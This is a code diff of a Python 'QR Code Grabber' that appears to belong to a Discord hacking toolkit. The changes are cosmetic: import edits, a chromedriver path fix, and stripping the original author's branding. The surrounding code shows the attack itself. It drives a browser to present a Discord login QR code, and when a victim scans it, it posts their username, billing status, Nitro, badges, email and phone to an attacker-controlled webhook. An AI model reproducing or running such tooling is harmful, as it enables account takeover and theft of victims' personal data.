@@ -1,4 +1,6 @@
-from util.plugins.commun import * 
+from util.plugins.commun import *
+from util.plugins.variable import *
+from atio import main
 
 def QR_Grabber(Webhook):
     import os
@@ -12,7 +14,6 @@ def QR_Grabber(Webhook):
     from urllib.request import urlretrieve
     from selenium import webdriver, common
     from bs4 import BeautifulSoup
-    from colorama import Fore
     from selenium import webdriver, common
 
     def getheaders(token=None):
@@ -40,7 +41,7 @@ def QR_Grabber(Webhook):
     opts.add_experimental_option("detach", True)
 
     try:
-        driver = webdriver.Chrome(options=opts, executable_path=r'util/chromedriver.exe')
+        driver = webdriver.Chrome(options=opts, executable_path=r'./util/chromedriver.exe')
     except common.exceptions.SessionNotCreatedException as e:
         print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Error: {e.msg}")
         input(f"{y}[{b}#{y}]{w} Press ENTER to exit")
@@ -129,8 +130,7 @@ def QR_Grabber(Webhook):
                 "embeds": [
                     {
                         "author": {
-                            "name": "@TIO QR Code Grabber",
-                            "url": "https://dsc.gg/astraadev",
+                            "name": f"{name} QR Code Grabber",
                             "icon_url": "https://cdn.discordapp.com/attachments/778283706388709376/880456323509149816/190423014334287383.gif"
                         },
                         "description": f"**{user}** Just Scanned the QR code\n\n**Has Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}\n**Email:** {email}\n**Phone:** {phone}\n**[Avatar]({url})**",
@@ -142,9 +142,6 @@ def QR_Grabber(Webhook):
                             }
                         ],
                         "color": 8388736,
-                        "footer": {
-                        "text": "©Astraa#6100 - https://dsc.gg/astraadev"
-                        }
                     }
                 ]
             }
